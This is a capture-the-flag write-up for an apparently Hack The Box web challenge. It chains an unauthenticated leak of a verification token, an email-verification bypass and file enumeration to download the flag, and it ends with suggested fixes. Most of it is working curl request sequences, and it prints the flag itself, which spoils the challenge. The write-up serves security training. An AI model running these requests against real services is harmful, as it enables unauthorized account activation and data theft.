# HTB Web Challenge — GoNuclear Vault System

> **Flag:** `HTB{g00d_j0b_r3g1str4ti0n_byp4s5}`  
> **Difficulty:** Easy  
> **Category:** Web / API Security  
> **Vulnerabilities:** Unauthenticated Information Disclosure → Email Verification Bypass → IDOR

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Tools Used](#tools-used)
3. [Step 1 — Reconnaissance & Endpoint Discovery](#step-1--reconnaissance--endpoint-discovery)
4. [Step 2 — Reading the OpenAPI Specification](#step-2--reading-the-openapi-specification)
5. [Step 3 — Register an Account](#step-3--register-an-account)
6. [Step 4 — Exploit Unauthenticated Info Disclosure on /api/userDetails](#step-4--exploit-unauthenticated-info-disclosure-on-apiuserdetails)
7. [Step 5 — Bypass Email Verification](#step-5--bypass-email-verification)
8. [Step 6 — Login and Obtain JWT](#step-6--login-and-obtain-jwt)
9. [Step 7 — List Files and Find the Flag (IDOR)](#step-7--list-files-and-find-the-flag-idor)
10. [Step 8 — Download the Flag](#step-8--download-the-flag)
11. [Vulnerability Summary](#vulnerability-summary)
12. [Full Attack Chain Diagram](#full-attack-chain-diagram)

---

## Challenge Overview

**GoNuclear Vault System** is a FastAPI-based document vault application. The goal is to read `flag.txt`, which is stored as a file owned by the admin user. Access requires authentication, but the registration flow contains a critical information disclosure vulnerability that allows any user to bypass email verification and access the platform — and ultimately read files belonging to other users via IDOR.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `ffuf` | Web fuzzing / endpoint discovery |
| `curl` | HTTP request crafting |
| `jq` | JSON parsing |
| `python3 -m json.tool` | Pretty-printing JSON |

---

## Step 1 — Reconnaissance & Endpoint Discovery

Start by fuzzing for API endpoints and common web routes.

### Fuzz with an API-specific wordlist first:

```bash
ffuf -u "http://<TARGET>/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
```

**Results:**

```
api/docs          [Status: 200]   ← Swagger UI
api/openapi.json  [Status: 200]   ← Full API specification
```

### Fuzz for general web routes:

```bash
ffuf -u "http://<TARGET>/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -fc 301,302,404
```

**Results:**

```
login     [Status: 200]
register  [Status: 200]
logout    [Status: 200]
```

> **Key insight:** The app has a Swagger UI at `/api/docs` and an OpenAPI spec at `/api/openapi.json` — these are the most valuable assets at this stage.

---

## Step 2 — Reading the OpenAPI Specification

The OpenAPI spec reveals every route, its parameters, required auth, and response schemas — essentially the full source of truth for the API.

```bash
curl http://<TARGET>/api/openapi.json | python3 -m json.tool
```

Or visit it visually in the browser: `http://<TARGET>/api/docs`

### All discovered endpoints:

| Method | Path | Auth Required | Notes |
|--------|------|--------------|-------|
| POST | `/api/login` | No | Returns JWT |
| POST | `/api/register` | No | Creates user |
| POST | `/api/userDetails` | **No** | ⚠️ Returns `verifyToken`! |
| POST | `/api/email-verify` | No | Verifies account with token |
| GET | `/api/files` | Yes (Bearer) | Lists all visible files |
| POST | `/api/files/upload` | Yes (Bearer) | Upload a file |
| GET | `/api/files/{id}` | Yes (Bearer) | Get file metadata |
| GET | `/api/files/{id}/download` | Yes (Bearer) | Download file content |
| DELETE | `/api/files/{id}` | Yes (Bearer) | Delete a file |

### Critical observation in the spec:

The `UserDetailsResponse` schema exposes `verifyToken`:

```json
"UserDetailsResponse": {
    "properties": {
        "id":           { "type": "integer" },
        "email":        { "type": "string" },
        "is_verified":  { "type": "boolean" },
        "verifyToken":  { "type": "string" },  ← THIS SHOULD NEVER BE EXPOSED
        "last_login":   { "type": "string" }
    }
}
```

And this endpoint requires **no authentication** — any caller can query any user's token.

---

## Step 3 — Register an Account

Since login requires an active (verified) account, register first.

```bash
curl -X POST http://<TARGET>/api/register \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@gonuclear.com","password":"password123"}'
```

**Response:**

```json
{"message":"User registered successfully"}
```

At this point the account is **inactive** — trying to log in returns:

```json
{"detail":"Inactive user"}
```

Normally, the app would send an email with a verification link. We don't have access to that email, but we don't need it.

---

## Step 4 — Exploit Unauthenticated Info Disclosure on /api/userDetails

The `/api/userDetails` endpoint accepts any email address and returns the user's full details — **including their `verifyToken`** — without any authentication check.

```bash
curl -X POST http://<TARGET>/api/userDetails \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@gonuclear.com"}'
```

**Response:**

```json
{
  "id": 3,
  "email": "attacker@gonuclear.com",
  "is_verified": false,
  "created_at": "2026-06-26T07:54:11.897126",
  "verifyToken": "9e2d6aa6-3824-42d4-8eb4-1771d7e23a58",
  "last_login": null
}
```

We now have the `verifyToken` that was supposed to be delivered privately via email.

> **Why this is a vulnerability:** The verification token is a secret that should only be delivered out-of-band (via email). Exposing it in an unauthenticated API response completely defeats the purpose of email verification.

You can also probe the admin account:

```bash
curl -X POST http://<TARGET>/api/userDetails \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@gonuclear.com"}'
```

```json
{
  "id": 1,
  "email": "admin@gonuclear.com",
  "is_verified": true,
  "verifyToken": null,
  "last_login": "2025-06-18T04:02:30.265647"
}
```

Admin is already verified and has no token, so we cannot re-verify them. But we don't need to — we just need *any* authenticated account to access the files.

---

## Step 5 — Bypass Email Verification

Use the leaked token to verify our own account via the `/api/email-verify` endpoint:

```bash
curl -X POST http://<TARGET>/api/email-verify \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@gonuclear.com",
    "token": "9e2d6aa6-3824-42d4-8eb4-1771d7e23a58"
  }'
```

**Response:**

```json
{"message":"Email verified successfully"}
```

Our account is now active.

---

## Step 6 — Login and Obtain JWT

```bash
TOKEN=$(curl -s -X POST http://<TARGET>/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@gonuclear.com","password":"password123"}' \
  | jq -r '.access_token')

echo $TOKEN
```

**Response:** A signed HS256 JWT:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2...
```

Decode the payload to confirm identity:

```bash
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null
```

```json
{"sub":"attacker@gonuclear.com","exp":1782462919}
```

---

## Step 7 — List Files and Find the Flag (IDOR)

Use the JWT to list all accessible files:

```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://<TARGET>/api/files
```

**Response (trimmed):**

```json
[
  {"id":1, "original_filename":"reactor_blueprint_v2.pdf",    "owner_id":1, "is_public":true},
  {"id":2, "original_filename":"enrichment_protocols.txt",    "owner_id":1, "is_public":true},
  {"id":3, "original_filename":"waste_disposal_plan.docx",    "owner_id":1, "is_public":true},
  {"id":4, "original_filename":"security_assessment.pdf",     "owner_id":1, "is_public":true},
  {"id":5, "original_filename":"flag.txt",                    "owner_id":1, "is_public":true},
  {"id":6, "original_filename":"employee_directory.xlsx",     "owner_id":1, "is_public":true}
]
```

All files have `owner_id: 1` (the admin) but are marked `is_public: true`. Our account (a different user) can enumerate and download them — this is **Insecure Direct Object Reference (IDOR)**: file access is controlled only by a numeric ID with no ownership enforcement.

`flag.txt` is **file ID 5**.

---

## Step 8 — Download the Flag

```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://<TARGET>/api/files/5/download
```

**Response:**

```
HTB{g00d_j0b_r3g1str4ti0n_byp4s5}
```

---

## Vulnerability Summary

### 1. Unauthenticated `verifyToken` Disclosure (Critical)

- **Endpoint:** `POST /api/userDetails`
- **Issue:** Returns the user's email verification token with no authentication required.
- **Impact:** Any attacker can self-register, immediately retrieve their own `verifyToken` via this endpoint, and verify the account — completely bypassing the email verification control.
- **Fix:** Remove `verifyToken` from the API response entirely. It is an internal secret and must never be returned over the API.

### 2. IDOR on File Access (Medium)

- **Endpoint:** `GET /api/files`, `GET /api/files/{id}/download`
- **Issue:** Any authenticated user can enumerate all files and download any file by ID, including files owned by other users.
- **Impact:** Full read access to all files in the vault regardless of ownership.
- **Fix:** Enforce ownership checks — a user should only be able to access files where `owner_id` matches their own user ID, unless the file has been explicitly shared.

---

## Full Attack Chain Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                    ATTACK CHAIN                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. RECON                                                   │
│     ffuf → /api/openapi.json → full route map leaked        │
│                                                             │
│  2. REGISTER                                                │
│     POST /api/register                                      │
│     └─→ Account created, is_verified = false                │
│                                                             │
│  3. INFO DISCLOSURE (No Auth Required!)                     │
│     POST /api/userDetails {"email":"attacker@..."}          │
│     └─→ verifyToken leaked in response                      │
│                                                             │
│  4. VERIFICATION BYPASS                                     │
│     POST /api/email-verify {email, token}                   │
│     └─→ Account activated without email access              │
│                                                             │
│  5. LOGIN                                                   │
│     POST /api/login                                         │
│     └─→ JWT access_token obtained                           │
│                                                             │
│  6. IDOR — LIST FILES                                       │
│     GET /api/files (Bearer token)                           │
│     └─→ Admin's files visible: flag.txt = ID 5              │
│                                                             │
│  7. READ FLAG                                               │
│     GET /api/files/5/download                               │
│     └─→ HTB{g00d_j0b_r3g1str4ti0n_byp4s5}                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```
